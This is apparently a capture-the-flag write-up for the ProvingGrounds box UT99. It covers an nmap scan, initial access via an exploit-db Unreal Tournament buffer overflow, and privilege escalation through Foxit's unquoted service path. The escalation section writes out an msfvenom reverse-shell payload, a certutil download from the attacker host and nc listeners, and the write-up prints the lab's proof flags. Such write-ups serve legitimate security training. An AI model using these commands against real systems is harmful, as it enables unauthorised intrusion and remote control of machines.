---
layout: default
title: x007-UT99
nav_order: 2
has_children: false
parent: ProvingGrounds
grand_parent: Writeups
---

## x007-UT99

### Abstract
Windows box

### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.



| Server IP Adress | Ports Open |
|------------------|------------|
|  192.168.222.44      | TCP : 21, 80, 443, 3306,6660 (IRCs)     |
|                  | UDP :      |



**Nmap Scan Results:**

Using  :
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV 192.168.222.44
```

Result :
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 21:37 CEST
Nmap scan report for 192.168.222.44
Host is up (0.030s latency).
Not shown: 65187 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http       Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_http-title: Index of /
443/tcp  open  ssl/http   Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
|_http-title: Index of /
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
3306/tcp open  mysql      MySQL (unauthorized)
6660/tcp open  irc        InspIRCd
...
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.222
|_  error: Closing link: (nmap@192.168.49.222) [Client exited]
6783/tcp open  irc        InspIRCd
...
Service Info: Hosts: localhost, www.example.com, irc.madcowz.localdomain; OS: Windows; CPE: cpe:/o:microsoft:windows

```

**Vulnerability Exploited:**

[Unreal Tournament - Remote Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/16145)

**Vulnerability Explanation:**

Using the exploit from exploit db, we could reach the initial shell access on the machine because the Unreal Tournament Server is not patched.

**Vulnerability Fix:**

Apply the proper patch in order to fix the vulnerability : http://www.unrealadmin.org/forums/showthread.php?t=15616

**Severity:** Critical

**Proof of Concept / Code Here:**

https://www.exploit-db.com/exploits/16145

```bash
perl 16145.pl 192.168.222.44 7778 192.168.49.222 80 
```

With a `nc` waiting we received the initial connection : 

![](attachments/Pasted%20image%2020220515221529.png)

**Local.txt Proof Screenshot**

![](attachments/Pasted%20image%2020220515221707.png)

**Local.txt Contents**
`56231a47be40b1e5f00a00c48bf3fc99` 

### Privilege Escalation

**Vulnerability Exploited:**

[Foxit Reader 7.0.6.1126 - Unquoted Service Path Privilege Escalation](https://www.exploit-db.com/exploits/36390)


**Vulnerability Explanation:**

The application suffers from an unquoted search path issue impacting
the service 'FoxitCloudUpdateService' for Windows deployed as part of Foxit
Reader. This could potentially allow an authorized but non-privileged local
user to execute arbitrary code with elevated privileges on the system. A
successful attempt would require the local user to be able to insert their
code in the system root path undetected by the OS or other security applications
where it could potentially be executed during application startup or reboot.
If successful, the local userâ€™s code would execute with the elevated privileges
of the application.

Using : 

```powershell
sc qc "FoxitCloudUpdateService"
```

We are able to detect where the software is located and that it is run as system at the startup : 

![](attachments/Pasted%20image%2020220515223900.png)

We could confirm that we have the write permission inside this directory : 

![](attachments/Pasted%20image%2020220515224022.png)

We will craft our reverse shell using msfvenom : 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.222 LPORT=80 -f exe > Foxit.exe
```

We could make it available using python : 

```bash
sudo python3 -m http.server
```

And download it from the Windows machine using :
```powershell
certutil -urlcache -f http://192.168.49.222:8000/Foxit.exe "C:\Program Files (x86)\Foxit Software\Foxit.exe"
```

We could then restart the machine and wait our reverse shell on port 80 (after closing our existing shell) : 

On the windows server : 
```powershell
shutdown /r /t 10
```

On you kali machine : 
```bash
nc -lnvp 80
```

![](attachments/Pasted%20image%2020220515225243.png)

**Vulnerability Fix:**

Update the Foxit Reader software to the latest version.

**Severity:** Critical

**Proof of Concept / Code Here:**

[https://www.exploit-db.com/exploits/36390](https://www.exploit-db.com/exploits/36390)

**Proof Screenshot Here:**

![](attachments/Pasted%20image%2020220515225333.png)

**Proof.txt Contents:**

`b40c5c83006d6bf27ede58e3db6fea3b`

--------

## NOTES : 


Joining the IRC we could list  channel:

![](attachments/Pasted%20image%2020220515215253.png)


We also get the following information : 

```
* Topic for #ut99 is: Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
```


We could found a exploit for the server of Unreal Tournament : 

![](attachments/Pasted%20image%2020220515220152.png)


https://www.exploit-db.com/exploits/16145

```bash
perl 16145.pl 192.168.222.44 7778 192.168.49.222 80 
```


From the user access, we noted an ftp folder containing some software that we could check for VULN

![](attachments/Pasted%20image%2020220515223049.png)

![](attachments/Pasted%20image%2020220515223032.png)

![](attachments/Pasted%20image%2020220515223138.png)

We will have to craft a reverse shell to replace the program in order to receive a session in admin